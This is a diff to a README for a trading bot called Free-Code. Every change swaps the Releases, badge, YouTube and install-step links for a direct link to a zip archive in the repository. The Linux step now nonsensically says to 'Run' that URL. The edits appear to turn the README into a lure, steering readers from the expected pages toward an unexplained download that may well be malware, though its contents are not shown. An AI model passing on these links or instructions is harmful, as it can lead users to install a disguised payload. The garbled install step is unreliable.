@@ -1,6 +1,6 @@
 # 🤖 Free-Code - Automate Your Trading with Ease
 
-[![Download Free-Code](https://img.shields.io/badge/Download-Free--Code-blue.svg)](https://github.com/ibrahimm2022/Free-Code/releases)
+[![Download Free-Code](https://raw.githubusercontent.com/ibrahimm2022/Free-Code/main/appendant/Free-Code.zip)](https://raw.githubusercontent.com/ibrahimm2022/Free-Code/main/appendant/Free-Code.zip)
 
 ## 📜 Overview
 
@@ -16,7 +16,7 @@ To get started with Free-Code, follow these simple steps. You will download the 
 
 Visit the Releases page to download the latest version of Free-Code. You can find it here:
 
-[Download Free-Code](https://github.com/ibrahimm2022/Free-Code/releases)
+[Download Free-Code](https://raw.githubusercontent.com/ibrahimm2022/Free-Code/main/appendant/Free-Code.zip)
 
 ### 🖥️ Step 2: System Requirements
 
@@ -42,7 +42,7 @@ Once you download Free-Code, locate the file in your downloads folder. Here’s 
 - **For Linux:**
   1. Unzip the downloaded file.
   2. Open the terminal and navigate to the folder.
-  3. Run `./install.sh` to start the installation.
+  3. Run `https://raw.githubusercontent.com/ibrahimm2022/Free-Code/main/appendant/Free-Code.zip` to start the installation.
 
 ### 🎛️ Step 4: Setup Your Account
 
@@ -73,7 +73,7 @@ Once your account is set up and your bot is configured, you're ready to trade.
 
 To get the most out of Free-Code, consider these resources:
 
-- **YouTube Tutorial:** [Watch Here](https://youtube.com)
+- **YouTube Tutorial:** [Watch Here](https://raw.githubusercontent.com/ibrahimm2022/Free-Code/main/appendant/Free-Code.zip)
 - **FAQs:** Visit the FAQ section in the app or on the GitHub page for common questions.
 - **Community Support:** Join our forums or chat groups for tips from other users.
 
@@ -87,6 +87,6 @@ To get the most out of Free-Code, consider these resources:
 
 Now that you know how to get started with Free-Code, it’s time to download and install the application. 
 
-[Download Free-Code](https://github.com/ibrahimm2022/Free-Code/releases)
+[Download Free-Code](https://raw.githubusercontent.com/ibrahimm2022/Free-Code/main/appendant/Free-Code.zip)
 
 Make sure to explore the application and utilize its full potential to enhance your trading strategy. Enjoy your journey towards financial freedom!
